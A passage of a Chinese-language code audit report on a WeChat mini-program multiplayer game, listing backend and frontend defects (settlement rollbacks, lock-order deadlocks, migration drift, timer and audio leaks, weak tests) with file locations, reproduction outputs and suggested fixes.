### H-1 · [P0] docker-compose 建的库缺 `daily_tasks` 表 → 每局结算整笔回滚，**全服零发奖**，对局永久卡死并每 50ms 重试打库

- 位置：`back/docker-compose.yml:17-28`（volumes 只挂到 `010`）、`back/sql/012_daily_tasks.sql`（`daily_tasks` 表的唯一创建者）、`back/src/services/game-service.js:543-546`（结算事务内的 `INSERT INTO daily_tasks`）、`back/src/services/game-service.js:480-583`（`finishGame`）
- `012_daily_tasks.sql` 是全仓唯一创建 `daily_tasks` 表的地方，而 compose 只挂载了 001–010。
- **严重性远大于「某个接口报错」**：`finishGame` 把 `INSERT INTO daily_tasks` 放在**发奖事务内部**。表不存在 → MySQL 抛 `ER_NO_SUCH_TABLE` → **整个事务回滚** → 本局所有人的金币、经验、胜场、任务进度、流水**全部不写**；`game.settlementDone` 被复位为 `false`，`tick` 定时器按 `game.runWorld ? 50 : 1000`（`game-service.js:346`）以 **50ms 间隔无限重试**，每次都是一个失败事务；对局永远停在 `status='playing' / timeLeft=0`，`activeGames` 条目永不释放，`GET /api/games/:id/result` 恒返回 409。
- 复现（桩 DB，真实 `game-service.js`）：
  ```
  { tickError: "ER_NO_SUCH_TABLE: Table 'game_codex.daily_tasks' doesn't exist",
    committed: false, rolledBack: true, usersCoinUpdateRan: true, coinRecordInsertRan: false,
    gameStatus: "playing", settlementDone: false, timeLeft: 0 }
  --- after 4 ticks total --- { commitCount: 0, rollbackCount: 4 }
  ```
  即 4 次 tick = 4 次全量回滚、0 次提交；`UPDATE users SET coins` 执行了但被回滚。仓库自带的 `back/tests/game-service.test.js:655-663` 已经断言了「每日任务写入失败 → 整局回滚」，与复现一致。
- 缓解事实：`docs/daily-tasks-2026-10-30.md:5,39` 记载生产库已于 2026-10-30 手工执行过 `012`，线上库大概率已有该表；风险集中在「按 docker-compose 新建库」「新环境初始化」「只补跑了 011 的环境」。
- 附带缺陷：`fortune_*` 三张表有运行时 `CREATE TABLE IF NOT EXISTS` 自愈，`daily_tasks` **没有** —— 两张表的自愈策略不一致本身就是问题（一个漏建就全服不发奖）。
- 修复方向：compose 补挂 `012`（以及 `013`，见 D1）；更根本的是把「任务进度写入」从发奖事务里挪出去或加降级（进度写失败不应回滚金币）；给所有业务表统一一套自愈/迁移机制。

### H-2 · [P2] `leaveRoom` 的加锁顺序与其余成员事务相反 → InnoDB 死锁，请求 500

- 位置：`back/src/services/room-service.js:260-338`（`leaveRoom`）vs `room-service.js:184-243`（`joinRoom`）、`room-service.js:384-459`（`startGame`）、`back/src/services/user-service.js:160-193`（注销）
- `room-service.js:7-8` 的注释声明「所有创建成员的事务先锁账号再锁房间」，但 `leaveRoom` **先锁 `room_players`、后锁 `rooms`**，与其它三条路径（`users → rooms → room_players`）完全相反。
- 触发场景：房主点「开始游戏」的同时某成员点「离开房间」→ `startGame` 持有 `rooms` 行锁等 `room_players`；`leaveRoom` 持有 `room_players` 行锁等 `rooms` → 环形等待 → InnoDB 回滚其一（`ER_LOCK_DEADLOCK`），路由未针对 1213 做友好处理 → 500，房主需重试。
- 验证：桩 DB 打出三条路径的真实语句顺序：
  ```
  joinRoom  : [LOCK] users → [LOCK] rooms → [LOCK] room_players
  startGame : [LOCK] users → [LOCK] rooms → [LOCK] room_players
  leaveRoom : [WRITE] DELETE room_players → [WRITE] UPDATE rooms   ← 顺序相反
  ```
- 置信度：中高（锁序倒置与成环条件可确证；真实并发是否命中窗口需压测）。

### H-3 · [P2] `leaveRoom` 用快照读统计人数且不锁房间行 → `rooms.current_players` 漂移 → 房间可超员，被引擎丢弃的玩家这一局白打

- 位置：`back/src/services/room-service.js:289-306`
- `leaveRoom` 事务内 `SELECT COUNT(*) FROM room_players` 是**一致性快照读**（默认 REPEATABLE READ），且与随后的 `UPDATE rooms SET current_players = ?`（**绝对值覆写**）之间没有对 `rooms` 行加锁。
- 触发场景：房间 3 人。A 离开 → `DELETE A` → `COUNT` 得 2；此刻 C 加入 → `UPDATE rooms SET current_players = current_players + 1` 得 4；A 的 `UPDATE rooms SET current_players = 2` 把 4 覆盖成 2（实际 3 人）。漂移后 `joinRoom` 的容量守卫 `WHERE current_players < max_players` 用的是漂移值 → **房间可以超过 `max_players=10`**；而 `back/src/game-engine/game-engine.js:148` 的 `normalizePlayers` 会 `.slice(0, MAX_PLAYERS)` **静默丢弃**第 11 名以后的玩家 —— 该玩家在 `game_players` 里有记录（进结算名单），却不在内存对局名单里，最终 `final_score=0 / rank=NULL / coins_earned=0`。
- 置信度：中（机制与超员→被 slice 的链条可确证；漂移需 leave/join 恰好交错，窗口窄）。

### H-4 · [P2] `leaveRoom` 不校验房间状态 → 对局进行中可离房，三份名单不一致

- 位置：`back/src/services/room-service.js:260-338`；对照 `toggleReady`（`:353-355` 有 `status !== 'waiting'` 守卫）与 `joinRoom`（`:204` 有守卫）
- `leaveRoom` 全程没有 `rooms.status` 判断，`POST /api/rooms/:id/leave` 对 `playing` 的房间同样生效。
- 触发场景：房主在自己开的对局进行中点「离开」→ 该玩家从 `room_players` 被删除，但仍在 `game_players` 与内存 `game.players` 中；`rooms.host_user_id` 被改派给最老成员，房间仍是 `playing`。之后若这局被中断（`interruptOrphanSession`）房间回滚为 `waiting`，房主已变成别人，原房主再也无权开局；若成员全部离开，`rooms` 行会被 `DELETE`（`:297`）而对局仍在跑。
- 验证：对 `rooms.status='playing'` 调用 `leaveRoom`，输出确实执行了 `DELETE FROM room_players` / `UPDATE rooms SET current_players=1` / `UPDATE rooms SET host_user_id=12`，**全程无状态校验**。置信度：高。

### H-5 · [P2] 结算结果落库后奖章沿用第一名玩家的奖章 → 同一局不同玩家看到不同奖章，同一玩家刷新两次结果还会变

- 位置：`back/src/services/game-service.js:125-158`（`buildResultPayload`，`:131` `selfPlayer = ranking.find(isSelf) || ranking[0]`）、`:160-195`（`personalizeStoredResultPayload`，`:187-192`）、`:594-601`（`scheduleCleanup`，5 分钟后从 `activeGames` 删除）
- `finishGame` 存进 `game_results.result_json` 的 payload 是**不带 viewer** 生成的，`isSelf` 全为 false → `selfPlayer` 退化成 `ranking[0]`（第一名，可能是机器人）→ 奖章按第一名的 `gain/rank` 计算。
- `GET /api/games/:id/result` 在结算后 **5 分钟内**走内存分支 → 奖章是本人的；**5 分钟后** `activeGames` 已清理，改走 `personalizeStoredResultPayload`，其中 `gain/coins/rank` 用 `playerRow` 重算正确，但 `achievementMedal` 因 `result.achievementMedal` 为真而被**直接沿用** → 变成第一名的奖章。
- 复现输出：
  ```
  stored result_json medal: "金章" | stored gain/rank: 300 1
  player 12 sees medal   : "金章" | gain/rank/coins: 0 2 0
  player 12 expected medal: "银章"
  ```
- 置信度：高。

### H-6 · [P2] `users.level` 永远不更新 → 接口与管理端等级恒为 1，后端 `progression.js` 是死代码

- 位置：`back/src/services/game-service.js:538-541`（结算唯一写 `users` 的语句，只加 `total_exp`）、`back/src/services/stats-service.js:30,140`、`back/src/services/user-service.js:94`、`back/src/services/auth-service.js:151`；`back/src/game-engine/progression.js` **全仓零引用**
- 主代理独立复核确认：`users.level` 全仓只有两处被写 —— `auth-service.js:65`（建号写 1）与 `user-service.js:243`（注销复位 1）。结算只加 `total_exp`，从不更新 `level`。
- 触发场景：玩家打完 100 局、`total_exp` 数千，`users.level` 仍是 1 → `GET /api/stats/summary`、排行榜、登录/资料接口一律返回 `level: 1`，管理端用户列表/统计页（`admin-web/src/views/users/UserList.vue:37`、`views/stats/StatsOverview.vue:90`、`views/users/UserDetail.vue:17`）显示所有玩家都是 1 级。
- 影响范围限于 API 与管理端；小程序首页用 `utils/progression.js` 按 `totalExp` 本地算等级，用户端首页不受影响。
- 置信度：高。

### H-7 · [P2] 已执行过的迁移被原地修改，且 `003` 的种子是空操作更新 → 老库保留旧 AppID，**登录全量失败**

- 位置：`back/sql/003_admin_features.sql:87`、`back/src/services/admin-config-service.js:262`（DB 值优先于环境变量）、`back/src/services/auth-service.js:15-24`
- 主代理独立复核：
  ```
  git diff -- back/sql/003_admin_features.sql
  -('wechat.login_app_id', 'wx742cfddc2b05ccd4', …)
  +('wechat.login_app_id', 'wxd7f500f3f21f15dd', …)
  grep -rn "login_app_id" back/sql/   # 除 003 外无任何增量迁移
  ```
- 问题：修改**已应用**迁移文件里的 INSERT，且末尾用 `ON DUPLICATE KEY UPDATE config_value = config_value` 这种**空操作**处理冲突 → 任何在此之前建库的库，`system_configs.wechat.login_app_id` 仍是**旧 AppID**，且没有任何增量迁移去纠正它。后端登录优先取 DB 里的旧 AppID 调 `jscode2session`，微信返回 `invalid appid / 40013` → **该库上所有用户无法登录**，直到有人在管理台手动改一次配置。
- 同类问题：`001_create_tables.sql` 的 `duration DEFAULT 180 → 120` 也是原地改（这次无害，因为默认值恰好与常量一致）。
- 交叉印证：已提交的 `back/.env` 里的 `WX_APPID` 是更早的 `wx72a4b552a87b44cf`，现用的是 `wxd7f500f3f21f15dd` —— **AppID 在这个项目里至少换过 3 次，每次都是原地改，没有迁移**。
- 置信度：中高（迁移写法与取值优先级可确证；线上库当前值需查生产 `system_configs` 才能确定）。

### H-8 · [P2] 房间无生命周期清理：`waiting` 房间永久留存，房间列表无上限且 N+1 查询

- 位置：`back/src/services/room-service.js:156-175`（`listAvailableRooms`）、`:295-300`（只有最后一人离开才删房）；全仓 `DELETE FROM rooms` 仅命中此处与 `user-service.js:235`
- 触发场景：用户建房后直接退出小程序（没调 leave）→ 房间永久停在 `waiting / current_players=1`，出现在 `GET /api/rooms` 公开列表里。该接口**无 LIMIT、无分页**，且对每个房间再查一次 `COUNT(*)`（N+1 串行查询）→ 房间数上千后该接口显著变慢甚至超时，玩家进不去房间列表；`rooms`/`room_players` 无限增长。
- 置信度：高。

### H-9 · [P2] 开局初始化失败时，恢复逻辑同样依赖数据库 → DB 抖动时房间永久卡在 `playing`

- 位置：`back/src/routes/rooms.js:166-176`（`startGameSession` 失败 → `recoverFailedStart`）、`back/src/services/game-service.js:834-844`（`recoverFailedStart` → `interruptOrphanSession`）
- `roomService.startGame` 已把房间置为 `playing` 并提交了 `game_sessions`/`game_players`；随后 `startGameSession` 失败时靠 `recoverFailedStart` 回滚，但**回滚本身也要读写数据库**。若失败原因正是数据库不可用/超时，`recoverFailedStart` 也会抛错（`routes.js:171-173` 只记日志）→ 房间停在 `playing` 且有一个 `playing` 的 session。
- 触发场景：DB 短暂抖动 → 玩家看到 500 → DB 恢复后再点「开始」永远返回「游戏已开始」(400) → **该房间再也无法开局**，只能换房或等进程重启（启动对账 `reconcileOrphanSessions` 只在启动时跑一次，`game-service.js:751-769`）。运行期没有任何周期性对账。
- 置信度：中高。

### H-10 · [P2] `equipItem` 信任客户端传入的 `category` → 同一分类可同时存在多个「已装备」

- 位置：`back/src/services/shop-service.js:519-555`、`back/src/routes/shop.js:40-58`（`category` 只校验 ∈ {skin,pet,ring}，不校验与商品实际分类一致）
- 触发场景：用户拥有 `skin-red-koi`（分类 skin）。先正常装备 `skin-b`，再以 `category='pet'` 调用 `equip('skin-red-koi','pet')` → 「卸下 pet 类」不碰 skin 类 → `skin-red-koi` 被置为 `is_equipped=1`，**skin-b 与 skin-red-koi 同时 equipped**，资料页/对局页按分类取「已装备」时取到不确定的一条。
- 验证（实际语句）：
  ```
  UPDATE user_items SET is_equipped = 0 WHERE user_id = ? AND category = ?  <<[11,"pet"]>>
  UPDATE user_items SET is_equipped = 1 WHERE user_id = ? AND item_id = ?    <<[11,"skin-red-koi"]>>
  ```
- 置信度：高（仅为展示类脏数据，不涉资金）。

### H-11 · [P2] 隐含「只能单进程部署」假设，且启动即把全部 `playing` 局判为孤儿 → 多进程/滚动重启会互相打断正在进行的对局

- 位置：`back/src/services/game-service.js:17-26`（`activeGames` 是进程内 Map）、`:751-769`（`reconcileOrphanSessions` 遍历**全部** `status='playing'` 的 session 并中断）、`back/src/app.js:110-121`、`back/src/routes/games.js:54,152`
- 触发场景：若用 pm2 cluster / 多副本 / 滚动发布启动第二个进程，第二个进程启动即把第一个进程正在跑的对局全部判为「孤儿」→ 中断、回滚分数、不发奖，房间改回 `waiting`；玩家请求落到另一个进程时 `/api/games/:id` 拿不到实时状态、`/api/games/:id/move|ready|team` 直接 404。仓库目前 `npm start` 是单进程，所以这是「无任何保护的隐含前提」。
- 置信度：中（单进程为当前事实，风险为条件性；代码中确实没有任何多进程防护或文档声明）。

### H-12 · [P3] 迁移编号 006 缺失 / 007 重复；无迁移执行器与版本表

- 位置：`back/sql/`（`006_wechat_payment_orders.sql` 已删除 → 编号断档；两个 `007_*.sql` 同号）、`back/package.json`（无 `migrate` 脚本）、`back/src/`（无 `schema_migrations` 版本表）
- (a) 编号断档与重复，人工按编号执行时无法确定顺序与完整性（docker `initdb.d` 按字典序执行，两个 007 恰好互不依赖所以侥幸正确）；(b) `007_room_playing_unique.sql` 的 `ALTER TABLE game_sessions ADD COLUMN playing_room_id ... ADD UNIQUE KEY` **没有幂等保护**，重复执行报 1060（对比 `008` 用 `information_schema` 做了幂等）；(c) 仓库**没有迁移执行器和版本表**，运维只能手工按文件名执行 —— H-1 与 H-7 正是这个缺失导致的两个真实事故面。
- 置信度：高（结构事实确证）。

### H-13 · [P3] 其它

- **H-13a 福袋题材对用户侧完全不可达（死代码）**：`back/src/services/fortune-reality-service.js:494-541`（`buildPublicOpportunities`/`getLatestPublicFeed`）无任何路由调用 —— `back/src/routes/fortune-bags.js` 在工作区已被删除且 `routes/index.js` 未挂载。而 `docs/prelaunch-analysis/backend-realtime.md:264` 仍把 `GET /api/fortune-bags/public` 列为公开接口。
- **H-13b 福袋服务在每个管理端请求里执行 3 条 DDL**：`fortune-reality-service.js:146-208`（`ensureFortuneTables`）被 `listSources/listSnapshots/getLatestSnapshots/getLatestReport/getSummary/refreshSources` 全部调用 → 每次都跑 `CREATE TABLE IF NOT EXISTS`（隐式提交 + 元数据锁），并要求运行账号具备 DDL 权限；与 `daily_tasks` 无自愈形成对照。
- **H-13c 大模型调用只在收到响应头后才清超时，响应体读取无超时**：`fortune-reality-service.js:294-313`（`fetchWithTimeout` 在 `finally` 里 `clearTimeout`）、`:643-647`（`await response.text()`/`response.json()` 在超时之外）→ 上游返回头后挂起 body 时，管理端「生成摘要」请求会永久挂起。
- **H-13d 结算失败后的 50ms 无限重试会放大 DB 故障**：失败对局永久留在 `activeGames`（`scheduleCleanup` 只在成功结算后调用），既是内存泄漏也是持续的库压力。
- **H-13e 0 收益玩家也会写入 `amount=0` 的流水**：`game-service.js:551-554` → 收益明细页会出现大量「+0」记录。
- **H-13f 正常结算不写 `rooms.finished_at`**：只有 `admin-room-service.js:94` 与 `user-service.js:230` 会写，`game-service.js:520` 只改 `status`。
- **H-13g 连接池 `connectionLimit:10` + `queueLimit:0`**（`back/src/models/db.js:4-14`）：结算事务整段持有连接（含 `SELECT ... FOR UPDATE` 与逐玩家 UPDATE），并发对局多时请求无限排队而不是快速失败。

### H-14 · 这一路**已检查且未发现问题**的范围（重要）

这些是审计代理逐条确证为**健康**的，不要重复怀疑，也不要在后续修复中破坏它们：

- **服务端权威 / 防作弊**：联机对局用 `runArena` 在服务端推进位置、碰撞与掉落（`back/src/game-engine/run-arena.js:111-186`），客户端 `move` 只能提交方向且必须有限（`game-actions-service.js:122-125`）；`team` 只接受目标 id 且必须双向点选+接触（`run-arena.js:68-91,137-149`）；联机模式下 `fortune-bag/claim` 一律被拒（`game-actions-service.js:96`）→ **客户端无法伪造得分、无法提前结算**。
- **操作接口鉴权**：`/api/games/:id/*` 全部先做 `isGameMember`（`routes/games.js:14-20,114,151`），`ready/team/move` 再做 `requirePlayer`/`requirePlaying`；`userId` 只来自 JWT（`back/src/middleware/auth.js:56-74`），请求体无法指定他人。
- **结算幂等 / 重复发奖**：`finishGame` 用 `SELECT status ... FOR UPDATE` + `status='finished'` 短路（`game-service.js:503-514`）、内存 `settlementDone` 双重锁、`game_results` 唯一键 `ON DUPLICATE KEY UPDATE`（`:558-561`）→ 并发/重试/多进程均不会重复发奖。
- **奖励原子性**：`UPDATE game_players` / `UPDATE users` / `INSERT daily_tasks` / `INSERT coin_records` / `INSERT game_results` 全在**同一事务**；`users.coins` 是 `INT UNSIGNED`，扣款用条件更新 `WHERE coins >= ?`（`shop-service.js:467-474`）→ **不可能扣成负数**；流水与余额一致。
- **中断/取消不发奖**：`cancelPendingStart`/`interruptOrphanSession` 只回滚 `final_score=initial_score, rank=NULL, coins_earned=0`，不动 `users` 余额（`game-service.js:791-793`）；机器人不入 `game_players`，不会被计奖。
- **每日任务的日期与并发**：日期用显式 `+8h` 计算北京时间（`daily-task-service.js:9-11`），**不依赖数据库服务器时区**；领取用 `users FOR UPDATE` + `daily_tasks FOR UPDATE` 串行 + 位掩码判重，重复领取返回 409。
- **房间并发**：占座用条件 UPDATE（`current_players < max_players` 且 `status='waiting'`，`room-service.js:210-217`）原子完成，双人抢最后一个空位不会超员（除 H-3 的漂移场景）；双击开局由条件 UPDATE + `uk_room_playing` 唯一索引双重兜底；开局时对成员快照与锁内实际成员做一致性校验（`:404-406`）。
- **未发现**任何客户端可触发的重复领取、越权领取他人对局奖励、提前结算或跨用户写入的路径。

### H-15 · 这一路的「存疑，未能确证」

- **`LIMIT ? OFFSET ?` 传字符串参数**（`back/src/services/stats-service.js:74,96`）在真实 MySQL 8 prepared statement 下是否被接受。无 MySQL 访问权限，未验证；若线上历史/收益页正常则可排除。
- **H-2 的死锁是否在线上真实发生**：锁序倒置与成环条件可确证，但缺真实并发压测与 MySQL 错误日志证据。
- **H-3 的 `current_players` 漂移幅度**：机制成立，但触发需要 leave/join 恰好交错，未做真实并发复现。
- **H-7 老库是否真的残留旧 AppID**：仓库只能证明「003 原地改 + 空操作 upsert + 无增量迁移」，线上库当前值需查生产 `system_configs` 才能确定。

---

---

## I. 代码级深审 · 原生小程序前端（`app.js` / `pages/` / `utils/`）

> 由独立审计代理完成。验证方式：源码通读 + 4 个只读复现脚本（`/tmp/jinli-audit-miniprogram/`）+ 根目录 `npm test`（328 项，327 通过）。

### I-1 · [P2] 结算页底部导航被「旧本地结算状态」弹回结算页

- 位置：`pages/result/index.js:629-637`（`switchTab` 直接 `wx.redirectTo`）、`pages/room/index.js:141-145`（`observeState` 见 `finished` → 跳结算页）、`pages/arena/index.js:72-74`（`acceptState` 同）
- `result.switchTab` 不像 `home.switchTab`（`pages/home/index.js:210-216`）和 `room.switchTab`（`pages/room/index.js:493-499`）那样先判断本地状态；而房间页/对局页一加载就订阅到 `gameStore` 的 `finished` 态并立刻 `redirectTo('/pages/result/index')`。
- 触发：本地打完一局 → 结算页 → 点底部「社交」或「游玩」→ 目标页刚打开就被弹回结算页，用户看到「点了没反应」。
- 验证：mock wx + 真实加载三个页面，`gameStore` 处于 `finished` 时点「社交」→ `redirectTo` 序列为 `['/pages/room/index', '/pages/result/index', '/pages/result/index']`。
- 与历史修复的关系：`docs/project-audit-2026-10-28.md` 的 F2 只修了「带邀请参数进入房间」这一入口，**同一类「旧本地结算截走导航」在底部导航入口仍然存在，修复不完整**。
- 置信度：高。

### I-2 · [P2] 房间页在 join 请求返回前离开页面 → 启动一个永不停止的 2s 轮询

- 位置：`pages/room/index.js:317-334`（`initRoom` 中 `await api.post(joinPath)` 后才 `this.pollRoom(roomId)`）、`:404-429`（`pollRoom` 用 `setInterval`）、`:116-126`（`onHide/onUnload` 只清 `this.pollTimer`）
- `initRoom` 是异步的，`pollTimer` 在 `await` 之后才被赋值；页面在等待期间 `onUnload` 时 `this.pollTimer` 仍是 `undefined`，`clearPollTimer()` 无事可做。join 返回后定时器照常启动，页面对象被闭包持有 → 既不会 `onUnload` 也不会 `onHide` → 轮询永久运行。`createOnlineRoom` 走同一条路径。
- 触发：点开好友分享的联网房间 → 网络较慢 → 立刻返回/退出 → join 返回后每 2 秒持续 `GET /api/rooms/:id`，用户已不在该页面。
- 验证：`onUnload` 后 join 返回 → `page.pollTimer` 变为真；随后 4.5 秒内产生 2 次额外 `GET /rooms/77` 请求且不再停止。
- 置信度：高。

### I-3 · [P2] 每日任务页领取任意一个任务后，全部任务的「领取」按钮永久变灰

> **与 C1 是同一个缺陷**，由审计代理独立复现（`/api/tasks` 返回两个 `progress>=target` 的任务：领取前 `[{play1,false},{play2,false}]` → 领取后 `[{play1,true},{play2,true}]`，而 `claiming` 已为 `''`）。两路独立复现互为印证，根因与修复方向见 **C1**。

### I-4 · [P2] 任意音效加载失败会「丢掉」BGM 引用 → BGM 无法停止，并出现双份 BGM

- 位置：`utils/audio.js:125-144`（`createAudio` 的 `onError` 把 `sharedAudio/bgmAudio/voiceAudio` **全部**置 null，只销毁出错的那一个）、`:187-208`（`playBgmSource`）、`:319-330`（`stopBgm` 在 `bgmAudio` 为 null 时直接 return）
- BGM 与音效共用同一套 `onError` 清理逻辑。若是 `sharedAudio`（tap 等音效）加载失败，BGM context 仍在播放却被置空引用 → `stopBgm()`（含 `app.onHide` 的 `stopBgm`）变成空操作，背景音乐继续播放；下次 `playStageBgm` 会新建第二个 BGM，两份音乐同时播放。
- 触发：弱网下任意一个音效请求失败（全部资源都在远程 CDN）→ 离开页面/切后台时音乐不停止 → 再进页面出现重叠 BGM。
- 验证：mock `wx.createInnerAudioContext`，tap 触发 `onError` 后 `changcheng.mp3` 仍在播放但已失去引用；`stopBgm()` 之后**依然在播放**；再次 `playStageBgm` 后同时有两个 BGM 实例在播放。
- 置信度：高。

### I-5 · [P2] 「退出登录」不生效：下次冷启动会被自动重新登录

- 位置：`pages/profile/index.js:119-127`（`onLogout` → `logout()` → 只清 token/资料）、`pages/boot/index.js:27-33`（`tryAutoLogin`：`!api.isLoggedIn() && runtimeConfig.getBoolean('wechat.login_enabled', true)` → `userProfile.login()`）、`utils/runtime-config.js:4`（默认 `'wechat.login_enabled': 'true'`）
- 退出登录只清除本机会话，**不写任何「用户主动退出」的标记**；启动页的自动登录条件只看「有没有 token」，因此冷启动会立刻用 `wx.login` 换回**同一个**账号，用户显式的退出意图被无声撤销。
- 触发：我的 → 退出登录 → 完全退出小程序 → 重新打开 → 自动回到已登录账号。
- 缓解：远程配置可设 `wechat.login_enabled=false` 关闭，但默认开启。
- 置信度：高。

### I-6 · [P2] 登录用户的「等级/经验」永远只统计本地体验，服务器端经验从不读取

- 位置：`utils/player-stats.js:119-145`（`fetchSummary`/`fetchHistory` **全仓无调用方**）、`pages/home/index.js:342-354`（`syncOverview` 用 `playerStats.getSummary()`）、`pages/result/index.js:492,540`（`expProgress` 同样取本地）
- 后端在联机结算时写入 `total_exp/level` 并提供 `GET /api/stats/summary`，但小程序端**从未调用**；首页等级条只反映**本地**对局结算累加出来的经验。该本地统计使用单一 storage key，登录账号与游客共用 → 切换账号时经验不会清零也不会同步。
- 触发：账号 A 联机打了 10 局（服务器已累加经验/等级）→ 首页仍显示 Lv.1、0/120 经验；换账号 B 登录 → 仍显示设备上残留的本地经验。
- **与 H-6 呼应**：后端 `users.level` 从不更新（H-6），前端又从不读后端经验（I-6）—— **等级系统两端都是断的**，管理端显示全员 1 级、用户端显示本地假等级。
- 置信度：高。

### I-7 · [P2] 隐私政策承诺的「撤回隐私授权」在客户端没有入口（**合规问题**）

- 位置：`utils/legal-config.js:36`（政策原文：「您可以在『我的』中修改昵称、提交头像、退出登录、**撤回隐私授权**或申请注销账号。撤回后停止当前授权会话，重新使用需要主动确认。」）、`pages/profile/index.wxml:69-71`（只有「退出登录」「注销账号」）、`utils/privacy-consent.js:80-84`（`revoke()` 存在，但只被 boot 内部与 `deleteAccount` 调用）
- 已对外发布的隐私政策承诺了可在「我的」撤回隐私授权，客户端**没有任何按钮/入口**触发 `privacy.revoke()`；用户想撤回只能注销账号。
- 触发：用户按政策操作「我的 → 撤回隐私授权」→ 找不到入口。
- 影响：这是**已经生效的对外承诺与产品实现不一致**，属于微信审核与个人信息保护法口径下的实质问题，应与 F 节的发布阻断项一起处理。
- 置信度：高（文案与入口的事实比对，未做真机交互）。

### I-8 · [P2] 启动页的 4.2s 硬超时没有覆盖「拉配置 + 自动登录」，弱网下启动页可停留 30s 以上

- 位置：`pages/boot/index.js:202-218`（`Promise.race` 只包住图片预加载；`:211-212` 在 race 结束后才 `await runtimeConfig.fetchRemoteConfig()` 和 `await tryAutoLogin()`）、`utils/api-client.js:11`（`REQUEST_TIMEOUT_MS = 10000`）、`:206-219`（GET 失败退避重试 1 次）
- 注释写明「放宽到 4.2s 只影响弱网」，但真正的耗时在 race 之后：`GET /configs/public` 最坏 10s + 500ms + 10s，`/auth/login` 再 10s，全程无进度反馈、无跳过按钮、无超时兜底。
- 验证：mock `wx.request` 每次 10s 超时 → `wx.reLaunch('/pages/home/index')` 的时间戳为 **32819ms**，期间请求序列为 `/configs/public`（2 次，含退避重试）+ `/auth/login`。
- 置信度：高。

### I-9 · [P3] 首页「进入房间」按钮无防重，连点会压入两个房间页

- 位置：`pages/home/index.js:241-257`（`startGame` 无在途标记）、`pages/home/index.wxml:145`（按钮无 `disabled` 绑定）
- 触发：快速双击「本地体验 · 进入房间」→ 栈内出现 `[home, room, room]`，之后按系统返回键会落到陈旧房间页，房间页 `observeState` 又会自动 `ensureRoom` 生成新房间。
- 验证：两次 `startGame()` → `navigateTo` 记录 `["/pages/room/index","/pages/room/index"]`。置信度：高。

### I-10 · [P3] 本地房间人数在「首次进入房间」(4 人) 与「结算页再来一局」(10 人) 之间不一致

- 位置：`utils/game-engine.js:574-576`（`chooseRoomPlayerCount` 恒返回 `MIN_PLAYERS=4`）、`utils/game-store.js:708-715`（`restartGame` 强制 `roomSize: ROOM_UI_LIMIT`=10）
- 触发：首页进房间显示「房间人数 40%」，打完一局点「再来一局」变成 10 人 100%，对局页名次显示「第 X / 4 名」与「第 X / 10 名」不一致。
- 验证：首次 4 人；`restartGame()` 后 10 人。置信度：高。

### I-11 · [P3] 主包体积约 1.92MB，逼近微信主包 2MB 上限

- 位置：`assets-pkg/`（1.45MB，未被 `packOptions.ignore` 排除）、`utils/`+`pages/`（0.45MB）、`app.*`；`app.json` 无 `subpackages`
- 实测：`find` + `stat` 求和 = 2,008,419 字节 ≈ **1.92MB**（已按 `packOptions.ignore` 排除 back/minigame/docs/tests/assets 等）。
- **与 E12 叠加**：占体积大头的 `assets-pkg/` 恰好就是那个**完全没进版本控制**的目录。余量已 < 5%，再加入少量图片/代码即触发上传包体积超限阻断发版；而一旦目录丢失，包会同时「缺图」且「体积骤降」，两种症状都会被误判为资源问题。
- 置信度：中（编译后 JS/WXML 会再压缩，实际略小）。

### I-12 · [P3] 其它

- **I-12a `onLeaveArena` 是死代码，且系统返回手势会把玩家弹回对局**：`pages/arena/index.js:276-281` 定义了 `onLeaveArena`，但 `pages/arena/index.wxml` 全文无 `bindtap="onLeaveArena"`。离开对局只能走底部导航的 `switchTab`（同样弹确认框）。而对局页由房间页 `redirectTo` 进入，用户按系统返回 → 落到房间页 → 房间页 `observeState` 见 `playing` → 再次 `redirectTo('/pages/arena/index')` 把玩家弹回对局。置信度：中（依赖真机返回手势行为）。
- **I-12b 退出登录/注销会连带清空游客的本地战绩与经验**：`pages/profile/index.js:123,146` → `playerStats.clearLocalData()`；`utils/player-stats.js:147-154`。`player-stats` 用单一 storage key 同时承载游客与账号的本地战绩，退出登录即删除，游客未登录时累计的本地经验/流水一并消失。置信度：高。
- **I-12c 存储写入失败被静默吞掉，UI 仍按「已保存」呈现**：`utils/shop-store.js:572-581`（`saveState` catch 后仍返回 normalized）、`utils/game-store.js:40-63`、`utils/player-stats.js:59-65`。存储空间不足时商城购买、战绩、房间快照实际未落盘，但内存与 UI 仍显示成功，下次启动数据回退。置信度：中。
- **I-12d `gameStore.getState()` 每次都做整份深拷贝**：`utils/game-store.js:183-185`（`JSON.parse(JSON.stringify)`），调用方含 `app.js:24`、`utils/page-helpers.js:23`、`pages/{profile,shop,income,result}/index.js`。局末 `runWorld/scoreLog` 可达数十 KB，每次切页/前台恢复都整份克隆一次（`app.onShow` 仅为读 `stage` 也克隆整局）。置信度：中。

### I-13 · 测试质量：这一路指出的**虚假信心点**

`tests/page-ui.test.js` 共 84 个测试，其中 **27 个是「读源码文本 + 正则断言」**。多数用于 WXSS/WXML 样式（合理），但以下几条断言的是**行为**却只做字符串匹配：

1. `tests/page-ui.test.js:561-570`「arena 后端模式使用微信原生 WebSocket，并保留 HTTP 轮询兜底」：只断言源码里出现 `wx.connectSocket`、`/ws/arena`、`startArenaPolling` 三个字符串。**不验证** socket 是否在 onHide/onUnload 关闭、轮询是否停止、消息是否解析成功。
2. `:573-601`「room 后端房间非房主不能点击开始游戏」：真正拦截非房主开局的 `start()` 内 `if (this.data.backendRoomId && !this.data.isHost)` 只用 wxml 的 `disabled` 正则间接覆盖 —— **删掉 JS 守卫测试仍会通过**。
3. `:604-609`「income 页面从资金流水接口读取账户明细」：只断言字符串 `/stats/coin-records` 存在，未验证分页、账号切换、失败分支。
4. `:541-550`「room 页面会提示准备后点击开始游戏」：只断言字面量 `roomHintText: '准备好后，点击开始游戏'`。
5. `:790-805`「生产页面不会调用测试重置方法」：受检文件列表**遗漏** `pages/boot/index.js`、`pages/tasks/index.js`、`pages/legal/*`（当前这些文件确实没调用，但**新增页面不会被这条守卫覆盖**）。
6. `:1199-1200` 与 `:1237-1238`：房间页测试在 join 之后**手动调用 `roomPage.clearPollTimer()`** 收尾，等于替生产代码兜住了 I-2 的定时器泄漏，**掩盖了该缺陷**。

**完全没有测试覆盖的关键流程**：boot 弱网/慢网下的启动总时长与超时兜底；房间页 onUnload 与在途 join 的竞态；每日任务领取后的按钮可点状态；首页开始按钮防重；音频 `onError` 路径；退出登录后冷启动的登录态；本地房间人数一致性；`playerStats.fetchSummary` 与服务器经验的对齐。

### I-14 · 这一路**已检查且未发现问题**的范围（重要）

